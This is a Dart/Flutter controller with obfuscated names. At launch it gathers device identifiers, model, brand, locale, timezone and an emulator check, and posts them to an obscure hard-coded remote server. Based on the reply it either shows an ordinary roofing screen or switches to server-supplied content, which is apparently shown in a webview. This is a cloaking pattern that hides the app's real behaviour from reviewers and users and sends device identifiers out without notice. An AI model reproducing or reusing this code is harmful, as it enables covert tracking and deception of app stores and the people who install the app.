import 'dart:convert';
import 'dart:io';

import 'package:device_info_plus/device_info_plus.dart';
import 'package:dio/dio.dart';
import 'package:flutter_inappwebview/flutter_inappwebview.dart';
import 'package:flutter_timezone/flutter_timezone.dart';
import 'package:get/get.dart';
import 'package:package_info_plus/package_info_plus.dart';

class PageLogic extends GetxController {

  var iqphfnj = RxBool(false);
  var trjdxb = RxBool(true);
  var kmzjevf = RxString("");
  var linda = RxBool(false);
  var koss = RxBool(true);
  final drfnopix = Dio();


  InAppWebViewController? webViewController;

  @override
  void onInit() {
    super.onInit();
    jznb();
  }


  Future<void> jznb() async {

    linda.value = true;
    koss.value = true;
    trjdxb.value = false;

    drfnopix.post("https://pai.tellh662.xyz/D82E5bz0e79",data: await gsplyb()).then((value) {
      var gcnhdsja = value.data["gcnhdsja"] as String;
      var wnkxo = value.data["wnkxo"] as bool;
      if (wnkxo) {
        kmzjevf.value = gcnhdsja;
        sebastian();
      } else {
        schmitt();
      }
    }).catchError((e) {
      trjdxb.value = true;
      koss.value = true;
      linda.value = false;
    });
  }

  Future<Map<String, dynamic>> gsplyb() async {
    final DeviceInfoPlugin oghscmnk = DeviceInfoPlugin();
    PackageInfo omunqbte_bqxmw = await PackageInfo.fromPlatform();
    final String currentTimeZone = await FlutterTimezone.getLocalTimezone();
    var jiyxvc = Platform.localeName;
    var cDjf = currentTimeZone;

    var OJzPp = omunqbte_bqxmw.packageName;
    var wajNfdP = omunqbte_bqxmw.version;
    var QNUos = omunqbte_bqxmw.buildNumber;

    var xBVQ = omunqbte_bqxmw.appName;
    var JPALj = "";
    var reginaldSpinka = "";
    var vAnFR = "";
    var nyahTillman = "";
    var QaqdxCO  = "";
    var clemensTowne = "";
    var carletonMurphy = "";
    var brielleBergstrom = "";


    var lXdN = "";
    var roRczs = false;

    if (GetPlatform.isAndroid) {
      lXdN = "android";
      var hqltnzbv = await oghscmnk.androidInfo;

      vAnFR = hqltnzbv.brand;

      JPALj  = hqltnzbv.model;
      QaqdxCO = hqltnzbv.id;

      roRczs = hqltnzbv.isPhysicalDevice;
    }

    if (GetPlatform.isIOS) {
      lXdN = "ios";
      var nkdqrzctah = await oghscmnk.iosInfo;
      vAnFR = nkdqrzctah.name;
      JPALj = nkdqrzctah.model;

      QaqdxCO = nkdqrzctah.identifierForVendor ?? "";
      roRczs  = nkdqrzctah.isPhysicalDevice;
    }
    var res = {
      "QNUos": QNUos,
      "carletonMurphy" : carletonMurphy,
      "wajNfdP": wajNfdP,
      "OJzPp": OJzPp,
      "JPALj": JPALj,
      "cDjf": cDjf,
      "vAnFR": vAnFR,
      "xBVQ": xBVQ,
      "clemensTowne" : clemensTowne,
      "QaqdxCO": QaqdxCO,
      "lXdN": lXdN,
      "roRczs": roRczs,
      "nyahTillman" : nyahTillman,
      "brielleBergstrom" : brielleBergstrom,
      "reginaldSpinka" : reginaldSpinka,
      "jiyxvc": jiyxvc,
    };
    return res;
  }

  Future<void> schmitt() async {
    Get.offAllNamed("/roofing_tab");
  }

  Future<void> sebastian() async {
    Get.offAllNamed("/roofing_build");
  }

}
